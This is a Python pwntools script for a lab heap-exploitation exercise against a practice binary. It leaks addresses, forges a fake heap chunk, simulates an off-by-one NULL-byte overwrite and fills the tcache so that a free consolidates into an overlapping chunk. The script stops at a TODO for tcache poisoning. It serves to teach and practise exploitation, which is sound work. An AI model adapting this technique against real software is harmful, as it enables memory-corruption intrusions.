#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")
    print(f"target address = {stack_ptr:#x}")

    # create an alloc to hold the fake chunk
    p.clean()
    p.sendline(b"malloc 0x38")
    p.recvuntil(b"[*] ")
    a_ptr = int(p.recvline()[:-1], 16)
    print(f"a_ptr = {a_ptr:#x}")

    # write the fake chunk at a_ptr
    p.sendline(f"write {a_ptr:#x} {8*4:#x}".encode())
    p.send(
        pwn.p64(0x0)   +            # prev_size
        pwn.p64(0xdeadbeef)  +      # size (placeholder)
        pwn.p64(a_ptr) +            # fd
        pwn.p64(a_ptr)              # bk
    )

    # create b_ptr alloc to overflow a NULL byte into the
    # metadata of the next chunk
    p.clean()
    p.sendline(b"malloc 0x28")
    p.recvuntil(b"[*] ")
    b_ptr = int(p.recvline()[:-1], 16)
    print(f"b_ptr = {b_ptr:#x}")

    b_chunk_size = 0x28
    print(f"b_chunk_size = {b_chunk_size:#x}")

    # create c_ptr alloc to overflow a NULL byte into the
    # metadata of the next chunk
    p.clean()
    p.sendline(b"malloc 0xf8")
    p.recvuntil(b"[*] ")
    c_ptr = int(p.recvline()[:-1], 16)
    print(f"c_ptr = {c_ptr:#x}")

    # simulate off-by-one error and overwrite chunk
    # metadata with NULL
    print("simulate off-by-one error and overwrite chunk metadata next to b alloc")
    p.sendline(f"write {b_ptr+b_chunk_size:#x} 0x1".encode())
    p.send(b"\x00")

    # use b alloc to write prev_size to target our fake chunk
    p.sendline(f"write {b_ptr+b_chunk_size-8:#x} 0x8".encode())
    fake_size = (c_ptr - 8*2) - a_ptr
    print(f"fake_prev_size = {fake_size:#x}")
    p.send(pwn.p64(fake_size))

    # write fake chunk in a alloc with fake size
    p.sendline(f"write {a_ptr:#x} {8*4:#x}".encode())
    p.send(
        pwn.p64(0x0) +          # prev_size
        pwn.p64(fake_size) +    # size
        pwn.p64(a_ptr) +        # fd
        pwn.p64(a_ptr)          # bk
    )

    # to fill tcache before freeing c alloc
    tcache_allocations = []
    for _ in range(7):
        p.clean()
        p.sendline(b"malloc 0xf8")
        p.recvuntil(b"[*] ")
        ptr = int(p.recvline()[:-1], 16)
        tcache_allocations.append(ptr)

    # fill 0x100 bin in tcache
    for current in tcache_allocations:
        p.sendline(f"free {current:#x}".encode())

    # free c alloc to consolidate back to the fake chunk
    # and create an overlap
    p.sendline(f"free {c_ptr:#x}".encode())

    # TODO: Next use the overlap for a tcache poisoning


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
